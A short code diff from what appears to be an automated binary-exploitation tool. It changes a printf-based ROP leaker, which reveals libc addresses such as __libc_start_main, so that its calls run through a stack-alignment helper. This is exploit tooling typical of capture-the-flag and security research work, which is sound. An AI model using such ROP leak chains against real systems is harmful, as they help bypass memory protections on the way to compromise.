@@ -26,9 +26,9 @@ def printf(state: PwnState) -> PwnState:
     LEAK_FUNCS = ["__libc_start_main", "printf"]
 
     def leaker(rop: ROP, address: int) -> ROP:
-        rop.printf(address)
+        arutil.align_call(rop, "printf", [address])
         # must send newline to satisfy ``arutil.leak_helper``
-        rop.printf(next(state.elf.search(b"\n\x00")))
+        arutil.align_call(rop, "printf", [next(state.elf.search(b"\n\x00"))])
         return rop
 
     return arutil.leak_helper(state, leaker, LEAK_FUNCS)
